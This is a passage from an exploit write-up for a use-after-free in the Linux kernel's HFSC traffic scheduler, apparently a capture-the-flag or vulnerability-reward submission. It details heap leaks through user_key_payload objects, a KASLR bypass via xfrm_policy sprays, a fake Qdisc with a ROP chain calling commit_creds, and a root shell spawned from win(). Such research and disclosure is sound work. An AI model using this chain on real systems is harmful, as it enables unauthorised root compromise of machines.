	heap_read_primitive->rb_tree_interface_qdisc_A_handle,
	heap_read_primitive->rb_tree_interface_classid_D,
	&rsc_D,
	NULL,
	NULL
);
```
- Kernel view of last step:
```c
static int
hfsc_change_class(struct Qdisc *sch, u32 classid, u32 parentid,
		  struct nlattr **tca, unsigned long *arg,
		  struct netlink_ext_ack *extack)
{
	struct hfsc_sched *q = qdisc_priv(sch);
	struct hfsc_class *cl = (struct hfsc_class *)*arg;
	struct hfsc_class *parent = NULL;
	struct nlattr *opt = tca[TCA_OPTIONS];
	struct nlattr *tb[TCA_HFSC_MAX + 1];
	struct tc_service_curve *rsc = NULL, *fsc = NULL, *usc = NULL;
	u64 cur_time;
	int err;

	if (opt == NULL)
		return -EINVAL;

	err = nla_parse_nested_deprecated(tb, TCA_HFSC_MAX, opt, hfsc_policy,
					  NULL);
	if (err < 0)
		return err;

	if (tb[TCA_HFSC_RSC]) {
		rsc = nla_data(tb[TCA_HFSC_RSC]);
		if (rsc->m1 == 0 && rsc->m2 == 0)
			rsc = NULL;
	}
	/* Writeup note: Deleted code for clarity */

	if (cl != NULL) {
		int old_flags;
		/* Writeup note: Deleted code for clarity */

		sch_tree_lock(sch);
		old_flags = cl->cl_flags;

		if (rsc != NULL)
			hfsc_change_rsc(cl, rsc, cur_time);
		/* Writeup note: Deleted code for clarity */

		if (cl->qdisc->q.qlen != 0) {
			int len = qdisc_peek_len(cl->qdisc);

			if (cl->cl_flags & HFSC_RSC) {
				if (old_flags & HFSC_RSC)
					update_ed(cl, len);
				else
					init_ed(cl, len);
			}

			/* Writeup note: Deleted code for clarity */
		}
		sch_tree_unlock(sch);

		return 0;
	}
	/* Writeup note: Deleted code for clarity */
}
```

- `cl` represent `class_D` and `cl->qdisc` represent `Qdisc_C`.
- `Qdisc_C->q.qlen == 1` => `cl->qdisc->q.qlen != 0`.
- Because we created `class_D` with `HFSC_FSC` flag, `(old_flags & HFSC_RSC) == false` and `init_ed()` is called.
- The reason I have to trigger `init_ed()` this way instead of the route `hfsc_enqueue()` -> `init_ed()` is `Victim_Qdisc->q.qlen == 0` from Step5.
Therefore, `hfsc_enqueue()` success will lead to `Victim_Qdisc->q.qlen == 1` and `hfsc_dequeue()` will break the `rb_tree` manipulation.

## Describe function `heap_read_primitive_trigger()`
[[exploit.c#L1302]](../exploit/lts-6.6.64/exploit.c#L1302)
- Perform heap leak by read from `user_key_payload` object that have `datalen` overwritten.

## Describe function `heap_read_primitive_reset()`
[[exploit.c#L1308]](../exploit/lts-6.6.64/exploit.c#L1308)
- In case we performed the heap leak and found no interested data, we can delete the network interface and free the remaining `user_key_payload` objects.

# Build KASLR bypass primitive
[[exploit.c#L1657]](../exploit/lts-6.6.64/exploit.c#L1657)
- Implemented in `find_kernel_base()` that basically perform the following things:
	1. Build a heap read primitive.
	2. Spray a lot of `xfrm_policy` objects (allocated on kmalloc-1024).
	3. Use heap read primitive to find `xfrm_policy_timer` function pointer to bypass KASLR.
	4. Destroy the heap read primitive in case we found nothing and retry the whole process again.

# Build code execution primitive
- Kernel primitive that the exploit leveraged for code execution:
```c
static struct sk_buff *
hfsc_dequeue(struct Qdisc *sch)
{
	struct hfsc_sched *q = qdisc_priv(sch);
	struct hfsc_class *cl;
	struct sk_buff *skb;
	u64 cur_time;
	unsigned int next_len;
	int realtime = 0;

	if (sch->q.qlen == 0)
		return NULL;

	cur_time = psched_get_time();
	cl = eltree_get_mindl(q, cur_time);
	/* Writeup note: Deleted code for clarity */

	skb = qdisc_dequeue_peeked(cl->qdisc); /* THIS IS OUR PRIMITIVE */
	/* Writeup note: Deleted code for clarity */
}

static inline struct sk_buff *qdisc_dequeue_peeked(struct Qdisc *sch)
{
	struct sk_buff *skb = skb_peek(&sch->gso_skb);

	if (skb) {
		skb = __skb_dequeue(&sch->gso_skb);
		if (qdisc_is_percpu_stats(sch)) {
			qdisc_qstats_cpu_backlog_dec(sch, skb);
			qdisc_qstats_cpu_qlen_dec(sch);
		} else {
			qdisc_qstats_backlog_dec(sch, skb);
			sch->q.qlen--;
		}
	} else {
		skb = sch->dequeue(sch); /* THIS IS WHERE CODE EXECUTION HAPPENDED */
	}

	return skb;
}

static inline struct sk_buff *skb_peek(const struct sk_buff_head *list_)
{
	struct sk_buff *skb = list_->next;

	if (skb == (struct sk_buff *)list_)
		skb = NULL;
	return skb;
}
```
- In `hfsc_dequeue()`, `cl` is our UAF_pointer => `cl->qdisc` is controllable.

- Implemented in 4 functions:
	1. code_execution_primitive_init()
	2. code_execution_primitive_setup_network_interface()
	3. code_execution_primitive_build_primitive()
	4. code_execution_primitive_trigger()

## Describe function `code_execution_primitive_init()`
[[exploit.c#L1318]](../exploit/lts-6.6.64/exploit.c#L1318)
- Function `code_execution_primitive_init()` perform the following things:
	1. Create NETLINK_ROUTE socket.
	2. Create raw packet socket.
	3. Prepare 3 qdisc handle and 2 classid.
	4. Prepare parameters for `struct user_key_payload` kernel object allocation.

## Describe function `code_execution_primitive_setup_network_interface()`
[[exploit.c#L1370]](../exploit/lts-6.6.64/exploit.c#L1370)
- Function `code_execution_primitive_setup_network_interface()` perform the following things:
	1. Create dummy network interface with `mtu == IPV6_MIN_MTU - 1` to avoid `ipv6_add_dev()` call in kernel. Reason:
		- `ipv6_add_dev()` -> `timer_setup(&ndev->rs_timer, addrconf_rs_timer, 0)`
		- `addrconf_rs_timer()` -> `ndisc_send_rs()` -> `ndisc_send_skb()`
		- `ndisc_send_skb()` will lead to packet send to network interface and trigger `sch->enqueue()`. This will mess with the scheduler manipulation process.
	2. Set the dummy network interface status to up.

## Describe function `code_execution_primitive_build_primitive()`
[[exploit.c#L1382]](../exploit/lts-6.6.64/exploit.c#L1382)
### Step1: Trigger uaf primitive
[[exploit.c#L1393]](../exploit/lts-6.6.64/exploit.c#L1393)
- Implemented the same way as Step1 in `heap_read_primitive_build_primitive()`.

### Step2: Reclaim `UAF_hfsc_class` with `struct user_key_payload` object.
[[exploit.c#L1409]](../exploit/lts-6.6.64/exploit.c#L1409)
- Implemented the same way as Step2 in `heap_read_primitive_build_primitive()`


### Step3: Leak `struct hfsc_class` object heap address by perform the following things:
[[exploit.c#L1428]](../exploit/lts-6.6.64/exploit.c#L1428)
- Implemented the same way as Step3 in `heap_read_primitive_build_primitive()`

### Step4: Prepare `user_key_payload` data that contain a fake Qdisc and ROPChain
- This is the only step that differ between LTS exploit and COS exploit.
- When we trigger code execution, LTS instance have RDI register point to the buffer contain ROPchain [[exploit.c#L1467]](../exploit/lts-6.6.64/exploit.c#L1467)
- When we trigger code execution, COS instance have RBX register point to the buffer contain ROPchain [[exploit.c#L1476]](../exploit/cos-109-17800.372.84/exploit.c#L1476)

### Step5: Delete `class_B`
[[exploit.c#L1508]](../exploit/lts-6.6.64/exploit.c#L1508)
```c
delete_tclass(
	code_execution_primitive->route_socket,
	code_execution_primitive->network_interface_ifindex,
	TC_H_MAJ(code_execution_primitive->classid_B),
	code_execution_primitive->classid_B
);
```
- We know the address of `class_B` (achieved from Step3).

### Step6: Reclaim `class_B` with `user_key_payload` object contain a fake Qdisc and ROPchain
[[exploit.c#L1515]](../exploit/lts-6.6.64/exploit.c#L1515)
```c
code_execution_primitive->key_B = user_key_payload_alloc(
	code_execution_primitive->key_B_desc,
	user_key_payload_write_buffer,
	sizeof(user_key_payload_write_buffer)
);
```

### Step7: Free `user_key_payload_A` and spray many `user_key_payload` such that `UAF_hfsc_class->qdisc` contain fake Qdisc prepared from Step4.
[[exploit.c#L1521]](../exploit/lts-6.6.64/exploit.c#L1521)
```c
memset(user_key_payload_write_buffer, 0, sizeof(user_key_payload_write_buffer));
fake_qdisc = (u64 *)
	(
		user_key_payload_write_buffer + \
		struct_hfsc_class_member_qdisc_offset - \
		sizeof(struct user_key_payload)
	);
*fake_qdisc = hfsc_class_leak_address + sizeof(struct user_key_payload);
fake_cl_e = (u64 *)
	(
		user_key_payload_write_buffer + \
		struct_hfsc_class_member_cl_e_offset - \
		sizeof(struct user_key_payload)
	);
*fake_cl_e = 0;
user_key_payload_free_and_wait_for_gc(&(code_execution_primitive->key_A));
for (u32 i = 0; i < code_execution_primitive->key_spray_count; i++)
	user_key_payload_alloc(
		code_execution_primitive->key_spray_descs[i],
		user_key_payload_write_buffer,
		sizeof(user_key_payload_write_buffer)
	);
```

### Step8: Because we need `->enqueue()` to success to trigger `->dequeue()`, Step8 ensure further `->enqueue()` will return `NET_XMIT_SUCCESS` by perform the following things:
- Create `pfifo_head_drop` qdisc with `sch->limit == 0xFFFFFFFF` and linked this qdisc with root class of `Victim_Qdisc`. You can choose other qdisc types here.
[[exploit.c#L1544]](../exploit/lts-6.6.64/exploit.c#L1544)
```c
struct tc_fifo_qopt pfifo_head_drop_qopt = { .limit = 0xFFFFFFFF };
create_pfifo_head_drop_qdisc(
	code_execution_primitive->route_socket,
	code_execution_primitive->network_interface_ifindex,
	code_execution_primitive->qdisc_A_handle,
	code_execution_primitive->qdisc_C_handle,
	&pfifo_head_drop_qopt
);
```
- Configure `Victim_Qdisc` to route enqueued packet to qdisc linked with root class.
[[exploit.c#L1552]](../exploit/lts-6.6.64/exploit.c#L1552)
```c
change_hfsc_qdisc_route(
	code_execution_primitive->route_socket,
	code_execution_primitive->network_interface_ifindex,
	TC_H_ROOT,
	code_execution_primitive->qdisc_A_handle,
	code_execution_primitive->qdisc_A_handle
);
```

## Describe function `code_execution_primitive_trigger()`
[[exploit.c#L1561]](../exploit/lts-6.6.64/exploit.c#L1561)
```c
void code_execution_primitive_trigger(struct code_execution_primitive *code_execution_primitive)
{
	trigger_qdisc_enqueue(
		code_execution_primitive->raw_packet_socket,
		code_execution_primitive->network_interface_ifindex
	);
	trigger_qdisc_enqueue(
		code_execution_primitive->raw_packet_socket,
		code_execution_primitive->network_interface_ifindex
	);
}
```

- Trigger `->enqueue()` 2 times.
- First time will lead to `qlen == 0` and `hfsc_dequeue()` will return early.
- Second time, `qlen == 1` and `hfsc_dequeue()` will lead to code execution.

# Exploit flow
With the primitives in hand, the exploit flow look likes:
- Save the registers state to return from kernel space to user space
[[exploit.c#L1769]](../exploit/lts-6.6.64/exploit.c#L1769)
```c
save_state();
```

```c
void save_state(void)
{
	__asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_rsp, rsp;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
}
```

- Pinning the current task into CPU core 0 with `sched_setaffinity` syscall. This is to maintain the exploit context in the same core to utilize percpu slab cache and freelist.
[[exploit.c#L1770]](../exploit/lts-6.6.64/exploit.c#L1770)
```c
pin_on_cpu(0);
```

- Create and enter user/network namespace.
[[exploit.c#L1771]](../exploit/lts-6.6.64/exploit.c#L1771)
```c
setup_namespace();
```

- Use KASLR bypass primitive to get kernel base
[[exploit.c#L1772]](../exploit/lts-6.6.64/exploit.c#L1772)
```c
u64 kernel_base = find_kernel_base();
```

- Update kernel address
[[exploit.c#L1773]](../exploit/lts-6.6.64/exploit.c#L1773)
```c
update_kernel_address(kernel_base);
```

```c
void update_kernel_address(u64 kernel_base)
{
	init_task += kernel_base;
	init_fs += kernel_base;
	push_rdi_pop_rsp_ret += kernel_base;
	mov_qword_ptr_rax_rsi_ret += kernel_base;
	mov_rdi_rax_rep_ret += kernel_base;
	pop_rdi_ret += kernel_base;
	pop_rcx_ret += kernel_base;
	pop_rsi_ret += kernel_base;
	add_rax_rcx_ret += kernel_base;
	add_rsp_0x8_ret += kernel_base;
	prepare_kernel_cred += kernel_base;
	commit_creds += kernel_base;
	find_task_by_vpid += kernel_base;
	swapgs_restore_regs_and_return_to_usermode_nopop += kernel_base;
}
```

- Trigger kernel code execution
[[exploit.c#L1790]](../exploit/lts-6.6.64/exploit.c#L1790)
```c
code_execution_primitive_setup_network_interface(&code_execution_primitive);
code_execution_primitive_build_primitive(&code_execution_primitive);
code_execution_primitive_trigger(&code_execution_primitive);
```

- Kernel return to `win()`
[[exploit.c#L1586]](../exploit/lts-6.6.64/exploit.c#L1586)
```c
void win(void)
{
	sleep(2);
	static char *sh_args[] = {"sh", NULL};
	execve("/bin/sh", sh_args, NULL);
}
```
- There seem to be some kind of local softirq work on the way, so call `execve` instantly sometime fail to get shell. (not sure)
- Workaround by perform `sleep(2)` seem to work.
